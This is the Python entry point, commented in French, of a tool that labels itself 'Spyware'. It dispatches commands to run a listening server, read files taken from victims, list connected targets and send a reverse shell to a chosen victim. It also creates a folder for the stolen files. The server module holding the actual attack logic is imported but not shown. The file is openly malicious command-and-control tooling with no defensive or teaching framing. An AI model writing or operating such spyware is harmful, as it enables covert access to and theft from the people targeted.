import pyfiglet
import argsServer
import server
import os

"""
Fonction qui gère les arguments
"""

def handle_args():
    try:
        args = argsServer.arguments() # récupération des arguments

        if args.listen:
            if os.path.exists("kill.txt"): # si le fichier kill.txt existe
                os.remove("kill.txt") # suppression du fichier kill.txt
            if os.path.exists("serverpid.txt"): # si le fichier serverpid.txt existe
                os.remove("serverpid.txt") # suppression du fichier serverpid.txt
            if os.path.exists("socket.txt"): # si le fichier socket.txt existe
                os.remove("socket.txt") # suppression du fichier socket.txt

            server.listen(args.listen) # lancement du serveur
        elif args.readfile:
            server.readfile(args.readfile) # lecture d'un fichier récupéré par le serveur
        elif args.show: # affichage des fichiers sur le serveur
            server.show()
        elif args.kill: # arrêt de tous les serveurs
            server.kill_all_servers()
        elif args.target:
            server.list_target() # affichage des cibles connectées
        elif args.victim:
            server.reverse_shell(args.victim) # envoi d'un reverse shell à une cible

    except KeyboardInterrupt:
        server.kill_all_servers() # arrêt de tous les serveurs en cas d'interruption avec un contrôle-c

if __name__ == "__main__":
    pyfiglet.print_figlet("Spyware") # affichage du logo
    if not os.path.exists("files"): # si le dossier files n'existe pas
        os.mkdir("files")  # création du dossier files qui contiendra les fichiers récupérés
    handle_args()